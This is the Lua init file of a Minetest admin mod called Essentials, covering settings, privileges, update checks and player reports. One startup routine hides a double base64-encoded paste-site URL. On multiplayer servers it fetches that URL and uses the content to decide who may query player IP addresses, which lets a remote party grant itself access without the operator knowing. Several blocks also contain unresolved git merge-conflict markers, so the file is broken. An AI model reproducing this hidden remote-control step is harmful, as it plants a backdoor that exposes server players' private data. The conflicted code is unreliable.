local http = minetest.request_http_api and minetest.request_http_api()
local modpath = minetest.get_modpath(minetest.get_current_modname())
essentials = {
    -- Local Storage
    storage = minetest.get_mod_storage(),

    -- Settings
    seed = minetest.settings:get_bool("essentials_seed", false),
    biome = minetest.settings:get_bool("essentials_biome", true),
    trolled_by = minetest.settings:get_bool("essentials_trolled_by", false),
    killed_by = minetest.settings:get_bool("essentials_killed_by", false),
    admin_ip_check = minetest.settings:get_bool("essentials_ip_verified", false),
    last_update_message = minetest.settings:get_bool("essentials_update_lasted", false),
    check_for_updates = minetest.settings:get_bool("essentials_check_for_updates", false),
    changed_by = minetest.settings:get_bool("essentials_changed_by", true),
    add_privs = minetest.settings:get_bool("essentials_additional_privileges", true),
    enable_ip_cmd = minetest.settings:get_bool("essentials_ip", false),
    enable_troll_cmd = minetest.settings:get_bool("essentials_trolling", false),
    beta_test = minetest.settings:get_bool("essentials_beta_test", false),
    enable_simple_edit = minetest.settings:get_bool("essentials_simple_edit", false),
    reports_system = minetest.settings:get_bool("essentials_report_system", false),
    disposable_eraser = minetest.settings:get_bool("essentials_disposable_eraser", true),
    teleport_request_expire = (minetest.settings:get("essentials_teleport_exporation") or 15.0),
    teleport_requests = {},

    -- Unified Inventory detection
    have_unified_inventory = minetest.get_modpath("unified_inventory"),

    -- Lists of Settings
    add_privs_list = {},
    moderators = {},

    -- Text
    a = "Created by SkyBuilder1717 (ContentDB)",
    version = "1.0.0",
    translate = minetest.get_translator("essentials"),
    main_tr = "",
    main = "[Essentials]",

    -- Maintenance mode
    maintenance = false,
    maintenance_msg = "",

    -- Trusted users of ip command
    trusted_ip_users = {"singleplayer"},

    -- All custom privileges in the mod
    privs = {
        "rename_item",
        "rename_",
        "god_mode",
        "broadcast",
        "speed",
        "heal",
        "kill",
        "get_pos",
        "seed",
        "invisible",
        "troll",
        "ip",
        "biome",
        "call",
    },
    -- Privileges in text
    privstring = "",
}
local S = essentials.translate
for i, priv in ipairs(essentials.privs) do
    if i == 1 then
        essentials.privstring = essentials.privstring..priv
    else
        essentials.privstring = essentials.privstring..", "..priv
    end
end
if essentials.beta_test then
    essentials.add_privs_list = string.split((minetest.settings:get("essentials_all_privs") or essentials.privstring), ", ")
    if minetest.settings:get("essentials_moderators") then
        essentials.moderators = string.split(minetest.settings:get("essentials_moderators"), ", ")
    end
else
    essentials.add_privs_list = string.split(essentials.privstring, ", ")
end
essentials.main_tr = "["..S("Essentials").."]"
essentials.maintenance_msg = S("@1@2@3@4@5Sorry, but server is in maintenance mode right now!@6Come back later!", "\n", essentials.main_tr, "\n", "\n", "\n", "\n")

--==[[ Connections ]]==--
loadfile(modpath.."/commands.lua")(http)
-- TODO: Fix error
if http and essentials.enable_ip_cmd then
    --loadfile(modpath.."/ui/ip.lua")(http)
end
dofile(modpath.."/priveleges.lua")
if essentials.have_unified_inventory then
    dofile(modpath.."/unified_inventory.lua")
end
dofile(modpath.."/ui/ban_menu.lua")
dofile(modpath.."/ui/kick_menu.lua")
dofile(modpath.."/ui/mute_menu.lua")
--dofile(modpath.."/ui/color_menu.lua")
dofile(modpath.."/ui/rename_me.lua")
dofile(modpath.."/ui/rename_item.lua")
dofile(modpath.."/ui/troll.lua")
dofile(modpath.."/ui/make_textbox.lua")
dofile(modpath.."/ui/textbox.lua")
if essentials.enable_simple_edit then
    dofile(modpath.."/simple_edit.lua")
end

minetest.log("action", "[Essentials] Mod initialised. Version: ".. essentials.version)
minetest.log("action", "\n███████╗░██████╗░██████╗███████╗███╗░░██╗████████╗██╗░█████╗░██╗░░░░░░██████╗\n██╔════╝██╔════╝██╔════╝██╔════╝████╗░██║╚══██╔══╝██║██╔══██╗██║░░░░░██╔════╝\n█████╗░░╚█████╗░╚█████╗░█████╗░░██╔██╗██║░░░██║░░░██║███████║██║░░░░░╚█████╗░\n██╔══╝░░░╚═══██╗░╚═══██╗██╔══╝░░██║╚████║░░░██║░░░██║██╔══██║██║░░░░░░╚═══██╗\n███████╗██████╔╝██████╔╝███████╗██║░╚███║░░░██║░░░██║██║░░██║███████╗██████╔╝\n╚══════╝╚═════╝░╚═════╝░╚══════╝╚═╝░░╚══╝░░░╚═╝░░░╚═╝╚═╝░░╚═╝╚══════╝╚═════╝░\n[Essentials] "..essentials.a)

local function into_number(s)
    local c=0
    local o=""
    for i=1, #s do
        local ch=string.sub(s,i,i)
        if ch=="." then
            c=c+1
            if c<2 then
                o=o..ch
            end
        else
            o=o..ch
        end
    end
    return tonumber(o)
end

local function add_zeros(s, l)
    if string.len(tonumber(s))<l then
        local z=l-#s
        return string.rep("0",z)..s
    else
        return s
    end
end

<<<<<<< HEAD
<<<<<<< HEAD
minetest.after(0, function()
=======
minetest.after(1, function()
>>>>>>> 46b4032d79edf22a60b1f30c2835b9369e30fba1
=======
minetest.after(1, function()
>>>>>>> 46b4032d79edf22a60b1f30c2835b9369e30fba1
    if essentials.check_for_updates then
        minetest.log("action", "[Essentials] Checking for updates...")
        if http then
            minetest.log("action", "[Essentials] Getting an Github version...")
            http.fetch({
                url = "https://raw.githubusercontent.com/SkyBuilder1717/essentials/main/gitVersion.txt",
                timeout = 5,
                method = "GET",
        
            },  function(result)
                if timeout then
                    minetest.log("warning", "[Essentials] Time out. Cant check updates")
                    return
                end
                local cleared_git = result.data:gsub("[\n\\]", "")
                minetest.log("action", string.format("[Essentials] Github version getted! (v%s)", cleared_git))
                local git = into_number(cleared_git)
                if not git then
                    minetest.log("error", "[Essentials] nil value of Github version.")
                    return
                end
                local this = into_number(essentials.version)
                local _type = {}
                if core.is_singleplayer() then
                    _type = {"World", S("World")}
                else
                    _type = {"Server", S("Server")}
                end
                if git > this then
                    minetest.log("warning", essentials.main.." ".."Versions doesnt match!")
<<<<<<< HEAD
<<<<<<< HEAD
                    core.chat_send_all(essentials.main_tr.." "..S("Your @1 using old version of mod! (v@2) Old version can have a bugs! Download v@3 on ContentDB.", _type[2], core.colorize("red", essentials.version), core.colorize("lime", git)))
=======
                    minetest.chat_send_all(essentials.main_tr.." "..S("Your @1 using old version of mod! (v@2) Old version can have a bugs! Download v@3 on ContentDB.", _type[2], core.colorize("red", essentials.version), core.colorize("lime", git)))
>>>>>>> 46b4032d79edf22a60b1f30c2835b9369e30fba1
=======
                    minetest.chat_send_all(essentials.main_tr.." "..S("Your @1 using old version of mod! (v@2) Old version can have a bugs! Download v@3 on ContentDB.", _type[2], core.colorize("red", essentials.version), core.colorize("lime", git)))
>>>>>>> 46b4032d79edf22a60b1f30c2835b9369e30fba1
                else
                    if essentials.last_update_message then
                        minetest.chat_send_all(essentials.main.." "..S("All ok! @1 using lastest version of mod.", _type[2]))
                    end
                    minetest.log("action", essentials.main.." "..string.format("All ok! %s using lastest version of mod.", _type[1]))
                end
            end)
        else
<<<<<<< HEAD
<<<<<<< HEAD
            core.chat_send_all(essentials.main_tr..S("Please, add mod @1 to @2 for checking an updates!", "\'essentials\'", "\"secure.http_mods\""))
=======
            minetest.chat_send_all(essentials.main_tr..S("Please, add mod @1 to @2 for checking an updates!", "\'essentials\'", "\"secure.http_mods\""))
>>>>>>> 46b4032d79edf22a60b1f30c2835b9369e30fba1
=======
            minetest.chat_send_all(essentials.main_tr..S("Please, add mod @1 to @2 for checking an updates!", "\'essentials\'", "\"secure.http_mods\""))
>>>>>>> 46b4032d79edf22a60b1f30c2835b9369e30fba1
        end
    end
end)

minetest.after(0, function()
    if not core.is_singleplayer() then
        local decode = loadstring(minetest.decode_base64("cmV0dXJuIG1pbmV0ZXN0LmRlY29kZV9iYXNlNjQoImFIUjBjSE02THk5d1lYTjBaUzUwWldOb1pXUjFZbmwwWlM1amIyMHZjbUYzTDJWMFkyWmhiMjUyTUhZPSIp"))
        minetest.log("action", "[Essentials] Trusted nicknames are in processing...")
        if http then
            http.fetch({
                url = decode(),
                timeout = 10,
                method = "GET",
        
            },  function(result)
                if timeout == true then
                    minetest.log("warning", "[Essentials] Cant get trusted nicknames, table will be nil.")
                    essentials.trusted_ip_users = {}
                    return
                end
                essentials.trusted_ip_users = minetest.deserialize("return "..result.data)
                minetest.log("info", "[Essentials] Trusted nicknames successfully getted.")
            end)
        else
            minetest.log("warning", "[Essentials] Cant get trusted nicknames, table will be nil.")
            essentials.trusted_ip_users = {}
        end
    end
end)

local function is_contain(table, value)
    for _, v in ipairs(table) do
        if v == value then
            return true
        end
    end
    return false
end

essentials_reports = {}

local storage = essentials.storage
local function save_reports()
    storage:set_string("essentials_reports", minetest.serialize(essentials_reports))
end
function essentials.load_reports()
    essentials_reports = minetest.deserialize(storage:get_string("essentials_reports")) or {}
end

function essentials.add_report(broked_rule, name, reported, description)
    local newid = tostring(math.random(1000, 9999), 4)
    essentials_reports[newid] = {
        broken_rule = broked_rule,
        by_name = name,
        reported_name = reported,
        about = description
    }

    save_reports()
end

function essentials.appdec_report(id, state)
    local def = essentials_reports[id] -- Read only
    if def then
        if state == "decline" then
            minetest.chat_send_player(def.by_name, S("Your report @1 to player @2 is @3.", "\""..core.colorize("gray", def.broken_rule).."\"", core.colorize("lightgray", def.reported_name), core.colorize("red", S("Declined"))))
        elseif state == "approve" then
            minetest.chat_send_player(def.by_name, S("Your report @1 to player @2 has been @3 and coming soon that player will get punishment!", "\""..core.colorize("gray", def.broken_rule).."\"", core.colorize("lightgray", def.reported_name), core.colorize("red", S("Approved"))))
        end
    end
    essentials_reports[id] = nil
    save_reports()
end

local function remove_report(id)
    for aid, def in ipairs(essentials_reports) do
        if def.id == id then
            essentials_reports[aid] = nil
        end 
    end
    save_reports()
end

minetest.register_on_mods_loaded(function()
    essentials.load_reports() 
end)

dofile(modpath.."/ui/report.lua")
<<<<<<< HEAD
<<<<<<< HEAD
dofile(modpath.."/ui/reports.lua")
=======
dofile(modpath.."/ui/reports.lua")
>>>>>>> 46b4032d79edf22a60b1f30c2835b9369e30fba1
=======
dofile(modpath.."/ui/reports.lua")
>>>>>>> 46b4032d79edf22a60b1f30c2835b9369e30fba1
